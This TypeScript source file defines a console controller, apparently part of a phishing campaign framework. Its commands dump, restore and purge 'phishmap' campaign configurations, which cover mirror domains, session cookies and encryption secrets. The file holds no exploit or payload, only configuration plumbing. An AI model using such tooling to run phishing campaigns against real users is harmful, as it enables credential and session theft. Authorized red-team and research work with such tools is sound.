import { DIContainer } from '@famir/common'
import { Logger, LOGGER } from '@famir/logger'
import { REPL_SERVER_ROUTER, ReplServerRouter } from '@famir/repl-server'
import { Validator, VALIDATOR } from '@famir/validator'
import { BaseController } from '../base/index.js'
import { DumpPhishmapArgs, Phishmap, PurgePhishmapArgs, RestorePhishmapArgs } from './phishmap.js'
import {
  dumpPhishmapArgsSchema,
  phishmapSchema,
  purgePhishmapArgsSchema,
  restorePhishmapArgsSchema,
} from './phishmap.schemas.js'
import { type PhishmapService, PHISHMAP_SERVICE } from './phishmap.service.js'

/**
 * DI token for the phishmap controller.
 *
 * @category Phishmap
 */
export const PHISHMAP_CONTROLLER = Symbol('PhishmapController')

/**
 * Represents the phishmap controller.
 *
 * @category Phishmap
 */
export class PhishmapController extends BaseController {
  /**
   * Registers the controller as a singleton in the DI container.
   *
   * @param container - The DI container to register in.
   */
  static register(container: DIContainer) {
    container.registerSingleton<PhishmapController>(
      PHISHMAP_CONTROLLER,
      (c) =>
        new PhishmapController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<ReplServerRouter>(REPL_SERVER_ROUTER),
          c.resolve<PhishmapService>(PHISHMAP_SERVICE)
        )
    )
  }

  /**
   * Resolves the controller from the DI container.
   *
   * @param container - The DI container to resolve from.
   * @returns The controller instance.
   */
  static resolve(container: DIContainer) {
    return container.resolve<PhishmapController>(PHISHMAP_CONTROLLER)
  }

  /**
   * Creates a new controller instance.
   *
   * @param validator - The validator instance.
   * @param logger - The logger instance.
   * @param router - The repl-server router instance.
   * @param phishmapService - The phishmap service instance.
   */
  constructor(
    validator: Validator,
    logger: Logger,
    router: ReplServerRouter,
    protected readonly phishmapService: PhishmapService
  ) {
    super(validator, logger, router)

    this.validator
      .addSchema('console-phishmap', phishmapSchema)
      .addSchema('console-dump-phishmap-args', dumpPhishmapArgsSchema)
      .addSchema('console-restore-phishmap-args', restorePhishmapArgsSchema)
      .addSchema('console-purge-phishmap-args', purgePhishmapArgsSchema)
  }

  /**
   * Registers used commands in the router.
   */
  use() {
    this.router.addCommand<DumpPhishmapArgs>(
      {
        name: 'phishmap-dump',
        description: `Dumps the campaign to phishmap file.`,
        schemaName: 'console-dump-phishmap-args',
        options: [
          {
            name: 'file',
            description: `The file path to save phishmap.`,
            type: 'string',
            alias: 'f',
          },
        ],
        params: ['campaign-id'],
      },
      (console, spec) => {
        console.log(
          `// Dumps the 'httpbin' campaign:\n` +
            `.${spec.name} httpbin -f phishmaps/httpbin-custom.json\n`
        )
      },
      async (console, spec, args) => {
        const phishmap = await this.phishmapService.dump({
          campaignId: args._[0],
        })

        const body = this.formatPhishmap(phishmap)

        await this.writeFile(args.file, body)

        console.log(`Phishmap dumped!`)
      }
    )

    this.router.addCommand<RestorePhishmapArgs>(
      {
        name: 'phishmap-restore',
        description: `Restores the campaign from phishmap file.`,
        schemaName: 'console-restore-phishmap-args',
        options: [
          {
            name: 'file',
            description: `The file path to load phishmap.`,
            type: 'string',
            alias: 'f',
          },
          {
            name: 'campaign-id',
            description: `The unique identifier for the campaign.`,
            type: 'string',
            default: null,
          },
          {
            name: 'mirror-domain',
            description: `The public-facing mirror domain for the campaign.`,
            type: 'string',
            default: null,
          },
          {
            name: 'description',
            description: `The human-readable description for the campaign.`,
            type: 'string',
            default: null,
          },
          {
            name: 'crypt-secret',
            description: `The secret used for encrypting session data.`,
            type: 'string',
            default: null,
          },
          {
            name: 'upgrade-session-path',
            description: `The URL path that triggers session upgrade.`,
            type: 'string',
            default: null,
          },
          {
            name: 'session-cookie-name',
            description: `The name of the cookie used to track authorized sessions.`,
            type: 'string',
            default: null,
          },
          {
            name: 'session-expire',
            description: `The TTL for a session in milliseconds.`,
            type: 'number',
            default: null,
          },
          {
            name: 'new-session-expire',
            description: `The TTL for a new session in milliseconds.`,
            type: 'number',
            default: null,
          },
          {
            name: 'message-expire',
            description: `The TTL for a message in milliseconds.`,
            type: 'number',
            default: null,
          },
        ],
      },
      (console, spec) => {
        console.log(`Returns the campaign model.\n`)

        console.log(
          `// Restores the 'httpbin' campaign from file:\n` +
            `.${spec.name} httpbin -f phishmaps/httpbin-local.json\n`
        )
      },
      async (console, spec, args) => {
        const body = await this.readFile(args.file)

        const phishmap = this.parsePhishmap(body)

        await this.phishmapService.restore({
          phishmap,
          campaignId: args.campaignId,
          mirrorDomain: args.mirrorDomain,
          description: args.description,
          cryptSecret: args.cryptSecret,
          upgradeSessionPath: args.upgradeSessionPath,
          sessionCookieName: args.sessionCookieName,
          sessionExpire: args.sessionExpire,
          newSessionExpire: args.newSessionExpire,
          messageExpire: args.messageExpire,
        })

        console.log(`Phishmap restored!`)
      }
    )

    this.router.addCommand<PurgePhishmapArgs>(
      {
        name: 'phishmap-purge',
        description: `Purges the campaign and all its contents.`,
        schemaName: 'console-purge-phishmap-args',
        options: [
          {
            name: 'force',
            description: `The confirmation flag.`,
            type: 'boolean',
            default: false,
          },
        ],
        params: ['campaign-id'],
      },
      (console, spec) => {
        console.log(`// Purges campaign:\n.${spec.name} httpbin --force\n`)
      },
      async (console, spec, args) => {
        if (args.force) {
          await this.phishmapService.purge({
            campaignId: args._[0],
          })

          console.log(`Campaign purged!`)
        } else {
          this.confirmAlert(console)
        }
      }
    )
  }

  /**
   * Formats Phishmap object to a Buffer.
   *
   * @param phishmap - The Phishmap object to format.
   * @returns The Buffer.
   * @throws {@link ReplServerError} If operation fails.
   */
  protected formatPhishmap(phishmap: Phishmap): Buffer {
    const json = this.encodeJson(phishmap)

    return this.str2buf(json)
  }

  /**
   * Parses a Buffer to a Phishmap object.
   *
   * @param buf - The Buffer to parse.
   * @returns The Phishmap object.
   * @throws {@link ReplServerError} If operation fails.
   */
  protected parsePhishmap(buf: Buffer): Phishmap {
    const json = this.buf2str(buf)

    const phishmap = this.decodeJson(json)

    this.validateData<Phishmap>('console-phishmap', phishmap)

    return phishmap
  }
}
